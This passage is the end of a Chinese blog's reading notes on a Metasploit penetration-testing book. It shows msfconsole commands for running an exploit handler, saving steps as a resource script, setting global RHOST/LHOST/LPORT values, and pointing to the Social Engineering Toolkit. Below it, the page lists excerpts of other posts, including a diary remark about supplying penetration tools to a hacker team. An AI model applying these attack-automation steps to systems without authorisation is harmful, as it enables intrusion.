msf explosit(handler)&gt; exploit // 执行攻击
</code></pre>

<p>那么我们可以在上述操作完之后，将其打包为脚本</p>

<pre><code>msf explosit(handler)&gt; makerc RCName
</code></pre>

<p>之后再使用时，直接调用即可</p>

<pre><code>msf&gt; resource RCName
</code></pre>

<p>这样就等同于之前了之前五步的全部操作。</p>

<p>对于后渗透测试部分，也有 <strong>AutoRunScript</strong> 这样的选项来一次性批量完成渗透和后渗透操作。</p>

<h4 id="全局变量">全局变量</h4>

<p>metesploit中可以使用  setg 这种命令来对 RHOST LHOST LPORT 等参数做全局设置，就免去了逐个设置的麻烦。</p>

<h4 id="使用社会工程学工具包">使用社会工程学工具包</h4>

<p>使用 社会工程学工具包（Social engineering tookit, SET）可以快速建立渗透攻击载荷。</p>

<p><a href="https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/">SET教程</a></p>
              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">标签</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://duzhi5368.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>

  <a class="tag tag--primary tag--small" href="https://duzhi5368.github.io/tags/%E9%BB%91%E5%AE%A2/">黑客</a>

                  </div>
                
              
            
            
  <div class="post-actions-wrap">
      <nav >
        <ul class="post-actions post-action-nav">
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/11/%E5%8D%8A%E6%9C%88%E8%AE%B020191018_20191031/" data-tooltip="半月记20191018_20191031">
              
                <i class="fa fa-angle-left"></i>
                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
              </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/" data-tooltip="读书笔记《黑客与画家》">
              
                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
                <i class="fa fa-angle-right"></i>
              </a>
            </li>
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%B2%BE%E9%80%9Ametasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
              <i class="fa fa-home"></i>
            </a>
          </li>
        
      
      
        <li class="post-action">
          <a class="post-action-btn btn btn--default" href="#disqus_thread">
            <i class="fa fa-comment-o"></i>
          </a>
        </li>
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  </div>


            
              
                <div id="disqus_thread"></div>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
              
            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2020 <a href="https://duzhi5368.github.io">FreeKnight</a>. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
        
  <div class="post-actions-wrap">
      <nav >
        <ul class="post-actions post-action-nav">
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/11/%E5%8D%8A%E6%9C%88%E8%AE%B020191018_20191031/" data-tooltip="半月记20191018_20191031">
              
                <i class="fa fa-angle-left"></i>
                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
              </a>
            </li>
            <li class="post-action">
              
                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6/" data-tooltip="读书笔记《黑客与画家》">
              
                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
                <i class="fa fa-angle-right"></i>
              </a>
            </li>
        </ul>
      </nav>
    <ul class="post-actions post-action-share" >
      
        <li class="post-action hide-lg hide-md hide-sm">
          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
            <i class="fa fa-share-alt"></i>
          </a>
        </li>
        
          <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%B2%BE%E9%80%9Ametasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
              <i class="fa fa-home"></i>
            </a>
          </li>
        
      
      
        <li class="post-action">
          <a class="post-action-btn btn btn--default" href="#disqus_thread">
            <i class="fa fa-comment-o"></i>
          </a>
        </li>
      
      <li class="post-action">
        
          <a class="post-action-btn btn btn--default" href="#">
        
          <i class="fa fa-list"></i>
        </a>
      </li>
    </ul>
  </div>


      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
  <i id="btn-close-shareoptions" class="fa fa-close"></i>
  <ul class="share-options">
    
      <li class="share-option">
        <a class="share-option-btn" target="new" href="https://duzhi5368.github.io/?=https%3A%2F%2Fduzhi5368.github.io%2F2019%2F10%2F%25E8%25AF%25BB%25E4%25B9%25A6%25E7%25AC%2594%25E8%25AE%25B0%25E7%25B2%25BE%25E9%2580%259Ametasploit%25E6%25B8%2597%25E9%2580%258F%25E6%25B5%258B%25E8%25AF%2595%2F">
          <i class="fa fa-home"></i><span>分享到 Homepage</span>
        </a>
      </li>
    
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=110" alt="作者的图片" />
    
    <h4 id="about-card-name">FreeKnight.Wong</h4>
    
      <div id="about-card-bio">Ever tried, ever failed, fail better.</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Game software engineer
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        Makati
      </div>
    
  </div>
</div>

    <div id="algolia-search-modal" class="modal-container">
  <div class="modal">
    <div class="modal-header">
      <span class="close-button"><i class="fa fa-close"></i></span>
      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
        <span class="searchby-algolia-text text-color-light text-small">by</span>
        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
      </a>
      <i class="search-icon fa fa-search"></i>
      <form id="algolia-search-form">
        <input type="text" id="algolia-search-input" name="search"
          class="form-control input--large search-input" placeholder="搜索" />
      </form>
    </div>
    <div class="modal-body">
      <div class="no-result text-color-light text-center"></div>
      <div class="results">
        
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2020/03/%E6%9C%88%E8%AE%B0202003/">
                <h3 class="media-heading">月记202003</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather">隔离 最近海外covid19也终于爆发了，于是从3月上旬再次在家隔离远程工作。
这次感觉和上个月完全不同了，先是海外交通封锁，虽然我并没有想着回国，但是作为一种可选择的保险，该途径的失效令人不快。
另外，这次政府行动了，封路封城，买不到饭令人非常不安。
公司的业务也受到了很大的影响，虽然没有放假，但其实也没有太多事情可做了。
开始我打算私自把aardio那块代码重构一遍，给自己交一个满意的答卷。但发现远程工作实在响应太慢，而且各种硬件的环境依赖，无法远程解决，于是放弃。
所以现在重心只能继续调整回英语日语和渗透部分了，还有健身，嗯，抗病毒只能靠身体，对吧。
肺炎 覆巢之下，难有完卵。
这次肺炎终于全球爆发了，海外都躲不开，原本按照规划，我应该这个月末到日本大版工作的，结果也因为肺炎，给死死卡在这边，有家回不去。
老婆生二胎了，我这个当爹的也只能在视频看看娃，不能守在身边，令我非常郁闷遗憾。
这次肺炎导致中国经济和国际经济都受到极大影响，美国股市四次熔断，标普直接跌掉10000点这些大家都知道了，但美国对自己的评估是，今年可能30%的失业率和GDP减少50%，讲真，吓死人。
我大天朝不想吐槽，最近忙着甩锅美国，十分有意思。很神奇的是，连我大学群里大部分人都信了。。。我大学同学26位，有10+位读研，大多在一线城市从事科技行业，也算高文化水平的人吧？竟然都信病毒从美国来……我整个三观就再见了。
所以我在微信不会谈任何政治可能相关的东西了，思想不一样的时候，真的没办法谈。
我现在是完全相信那句话了“人与人的差别比人与狗的差别还大”，不仅仅是财富，还有思想。
当然，我不是政治敏感体，没有任何兴趣为这些政治的事整理搜集什么东西，所以不提了。
但这个肺炎导致的中美关系恶化，是有目共睹的，欧洲之间也各种问题，油价也证明欧佩克俄国也之后不会省心，全球经济绝对受到巨大沉痛的打击，1933年大萧条我觉得都是轻的。
但现在谈经济都是太晚了，我担心的等疫情过去后，全球化会受到巨大影响，什么发展，全球化都要挂机，搞不好要冷战甚至局部热战。
如何很少的规避这种风险，是现在该去好好考虑的。
提高 如上面所提，未来的经济必然严重受挫，恢复可能需要长达数年的时间，我非常担心自己的收入问题。毕竟大环境不好的时候，35岁+的程序员在国内实在太难了。
而且因为工作内容过于散漫的原因，我已经没办法在任何一个点做出突破，只能继续做基础设施的搭建，能想到的只有英语和日语了。
英语
最核心，毫无疑问，必须大幅度提高，所以要趁着这段隔离时间利用起时间。
最近主要以背诵english convertation为主，每天一节1小时的内容，大约分为20段。一段要背15分钟，每天5小时，总共39课。目的是提高”说“的能力。
现在英语的听读能力我都不错，看youtube没问题，但就是不知道如何运用已知的单词和句型去表达，另外还有一些单词量的不足，只能背诵了。
日语
缓慢恢复，因为之后要去日本工作，到了那边再强化也来得及。
所以现在还是每天看看《大家的日本语》课程，每天一到两章节，初级也就30多天就过了。
渗透
把它列入的原因是最近接了一个长期性的外包，通过圈里人介绍，给一个黑客团队长期提供改良的渗透工具，既不脏手，也能提高技术，还有一份额外的长期收入，这令我非常满意。所以继续加强这块。
原本打算研究一下的python+uwsgi以及.net那块先放一下。
我现在是要多做做减法了。
生活 最近还报了个RYA的视频课程，其实基本概念之前都自学过，课程只是加深了记忆，真想去海上实操啊= =
老婆仔在家倒是一切安好，只是在疫情情况下自己生小孩，也真是让我的蛋疼到不行，估计还要分割两地半年至一年吧，不然小孩不能上飞机。
因为这疫情的问题，连未来的规划也都乱掉了。暂时想的可能还是之后把她和孩子丢到泰国读书把，或者更快一点的话，能迅速移民拉美会更好，总之计划现在乱的很。
疫情引起的公司业务的更变对我影响有点大，我要尽快补好英文以减少这种干扰。
收入情况今年可能不好，虽然工资加了一些，但股票应该是没有分红了，更倒霉的话，甚至有可能连本都丢掉。之所以这么焦虑，还是因为自己的收益过于绑定公司了，这是一个巨大的错误。
总而言之，要加强英语，进一步和公司利益割裂，不然危险很大。
我看忠孝 哈哈，我的二宝出来了，很开心。不过在给娃起名字这件事上让我离奇的愤怒。
之前大娃的名字就是我爸起的，我就就没做什么干涉，毕竟他也是第一次做爷爷会激动嘛，我也让一波好了。但是当时达成协议“第二胎名字公平起见，让我老婆起名”，我的理由是，作为监护人，”作为父亲的我“和”作为母亲的我老婆“拥有同等权利，这次让爷爷起名，算使用了我一次起名权，按理来说下一次也该我老婆使用起名权了。
我爸没想到会有二胎，答应了。
结果这次起名，他又非要参合进来各种搅合。
我来理一理，如何一步一步侵犯权力的哈：
1：祖宗确定了姓，我还没叛逆到这地步，就不多说其合理性了。然后我爸又非要用辈分，所以定了娃名字里第二个字第二个字，我老婆就只有一个字的命名权了，是不是让了第一步？
2: 我爸非要信阴阳五行，说小孩缺 ”火“，好，那我老婆起带火的五行的字，是不是让了第二步？
3：火呢？还分什么明火暗火。。。然后我爸又给了大约50个候选字，好，那我们在50个字里选一个总可以了把，让了第三步。
4：我老婆选了个 ”焜“，属于50个候选字之一，而且也和大宝的”烨“形成一对，挺好的，结果我爸就非要选”智“，非说这字好，没有理由，就是智比焜好，非要第三个字叫 智。
尼玛，这名字三个字都是你定的，凭什么? 我老婆还说了一堆”焜“比”智“更好的理由，而她妈也参合进来，说”我问了别人，智更好，孩子名听爷爷和姥姥的就好，你们快去休息吧“就打发我们了。
我非常非常不开心！其实当时就想怼回去 ”ok,那我现在就定孙子的名字，叫王八蛋，按照你们说的啊，孙子的名字由爷爷来定嘛，来嘛“。。不过考虑到不适合和丈母娘怼架，也不适合真的把孙子的命名权从他父母那边抢过来（那我不就真成第二个我爸了嘛），所以没说出来。但是现在也气的我不行。
借这个说远点儿。
我就觉得中国有点问题，就是在”忠孝“这些问题上。中国古代观念很不适合时代，可惜的是依然这种思想深刻存在。
先说”孝“。从三纲五常来说，”父为子纲“就是很多人现在依然存在的该死的观念。
拿上面例子来说，我妻子想的是一二三四五的证明”焜“比”智“好，而双方父母则是”好了，这事我们操心就好了，你们去睡觉，你们别管了“，这是什么心态？我们是，平等的进行沟通谈判的心态，对方却是”我不和你谈，我是你父母，你该听我的话“这种心态。这就是一个典型的不平等，是一种主仆附属心态。
我都已经过35快四十了，在外工作了十五年没用家里一分钱一点人脉关系，结婚有小孩了，这种完全独立的状态，都要被作为附属品来看待，为什么？之所以中国”巨婴“多，全这样处处干涉控制养出来的。
我看我妈带孩，全程紧跟，”这个不要碰，那个不要动会脏的，走路小心别摔着，这边小孩子不能去玩“，密切监视，你说她不好吗？她很好，很负责。但是小孩之后是什么样子，就是巨婴啊！
对于小孩，该怎么管？我的意见很简单，就是”远远的保护“，关注的底限就是”不要让他受到大的伤害，不要让他伤害别人“，目标是”给他更多的自由和选择“，就完了，接下来就靠他自己了。过多的干涉看起来很好，但是有用吗？哪个父母没告诉过他的子女”不要骗人要诚实“，那世界没骗子了？告诉小孩”走路慢点儿，小心点“，哪个小孩小时候没摔过。即使你拦住了这次，下次呢？
所以我们只要”远远的保护“不要让他受到巨大的破坏性伤害就好，小事你管得着吗？
我们再扯回来。</div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2020/03/modsecurity%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%E6%9C%AA%E5%AE%8C%E7%BB%93/">
                <h3 class="media-heading">ModSecurity网络安全防御策略【未完结】</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>ModSecurity网络安全防御策略</p>

<ul>
<li>基本防御方法</li>
<li>漏洞检测和修复</li>
<li>陷阱和蜜罐</li>
<li>使用第三方信息库</li>
<li>请求数据分析</li>
<li>响应数据分析</li>
<li>身份验证防护</li>
<li>会话状态防护</li>
<li>应用层攻击防护</li>
</ul>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2020/03/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E6%9C%AA%E5%AE%8C%E7%BB%93/">
                <h3 class="media-heading">sql注入攻防【未完结】</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>sql注入之前做的一些整理，和modsecurity一样，都是之前整理未完成的，因为已经熟悉了解就没有兴趣继续写下去了。权当备份。</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2020/02/%E6%9C%88%E8%AE%B0202002/">
                <h3 class="media-heading">月记202002</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Feb 2, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><ul>
<li>远程办公</li>
<li>电影：阿信的故事</li>
<li>日本</li>
<li>语言</li>
<li>技术进展</li>
</ul>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2020/01/%E6%9C%88%E8%AE%B0202001/">
                <h3 class="media-heading">月记202001</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jan 1, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>英语</p>

<p>《小森林》</p>

<p>工作</p>

<p>品葱</p>

<p>打飞机</p>

<p>武汉肺炎</p>

<p>《死亡搁浅》</p>

<p>《底特律：being human》</p>

<p>渗透</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2020/01/%E8%BF%9C%E7%A8%8B%E8%A7%86%E9%A2%91%E7%8B%BC%E4%BA%BA%E6%9D%80%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94/">
                <h3 class="media-heading">远程视频狼人杀技术调研</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jan 1, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>实时多人视频技术</p>

<p>手机前后摄像机同时拍摄技术</p>

<p>智能面部识别技术</p>

<p>视频压缩技术</p>

<p>数据备份和传输技术</p>

<p>用户敏感信息规避技术</p>

<p>面部加工技术</p>

<p>声音处理技术</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2020/01/android%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E8%B0%83%E7%A0%94/">
                <h3 class="media-heading">Android视频会议软件开发调研</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jan 1, 2020
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>最近公司要做基于视频的手机App游戏，类似于远程狼人杀或者远程会议（要各个玩家都露脸视频共享），所以要调研Android视频传输问题。</p>

<p>嗯，正文不用看了。结论：就是使用基于WebRTC封装的Licode.</p>

<p><a href="https://lynckia.com/licode/">https://lynckia.com/licode/</a></p>

<p>如果用的不顺，会退回WebRTC开发。</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201912/">
                <h3 class="media-heading">月记201912</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Dec 12, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p><strong>F.I.R.E与厄瓜多尔</strong></p>

<p><strong>小孩教育</strong></p>

<p><strong>Kali安装Tor</strong></p>

<p><strong>硬件中断输入</strong></p>

<p><strong>USB远程访问</strong></p>

<p><strong>Detours进行Windows dll劫持</strong></p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E6%B8%97%E9%80%8F%E9%97%AE%E7%AD%94/">
                <h3 class="media-heading">渗透问答</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Dec 12, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>利用问答方式，对渗透工作做一个全面的基础的回顾和整理。</p>

<p>也可以考虑用作渗透工程师面试题。</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E8%A2%AB%E5%8A%A8%E6%94%B6%E5%85%A5%E6%80%9D%E8%80%83/">
                <h3 class="media-heading">被动收入思考</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Dec 12, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>想F.I.R.E，但资金还是差了那么一丢丢，为了应对通膨，需要最基本的被动收入来支撑。</p>

<p>于是整理了一些对被动收入的理解和分析&hellip;</p>

<p>但是，依然没有什么太多的收获，作为以后备忘参考吧。</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
      </div>
    </div>
    <div class="modal-footer">
      <p class="results-count text-medium"
         data-message-zero=""
         data-message-one=""
         data-message-other="">
         273 posts found
      </p>
    </div>
  </div>
</div>
    
  
    
    <div id="cover" style="background-image:url('https://duzhi5368.github.io/images/cover.png');"></div>
  


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js" integrity="sha256-IFHWFEbU2/+wNycDECKgjIRSirRNIDp2acEB5fvdVRU=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js" integrity="sha256-+mpyNVJsNt4rVXCw0F+pAOiB3YxmHgrbJsx4ecPuUaI=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js" integrity="sha256-vMxgR/7FtLovVA+IPrR7+xTgIgARH7y9VZQnmmi0HDI=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js" integrity="sha256-N0qFUh7/9vLvia87dDndewmsgsyYoNkdA212tPc+2NI=" crossorigin="anonymous"></script>


<script src="https://duzhi5368.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>


<script>
$(document).ready(function() {
  hljs.configure({ classPrefix: '', useBR: false });
  $('pre.code-highlight, pre > code').each(function(i, block) {
    if (!$(this).hasClass('codeblock')) {
      $(this).addClass('codeblock');
    }
    hljs.highlightBlock(block);
  });
});
</script>

  
    
      <script>
        var disqus_config = function () {
          this.page.url = 'https:\/\/duzhi5368.github.io\/2019\/10\/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%B2%BE%E9%80%9Ametasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\/';
          
            this.page.identifier = '\/2019\/10\/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%B2%BE%E9%80%9Ametasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\/'
          
        };
        (function() {
          
          
          if (window.location.hostname == "localhost") {
            return;
          }
          var d = document, s = d.createElement('script');
          var disqus_shortname = 'duzhi5368-github-io';
          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    
  



    
  </body>
</html>

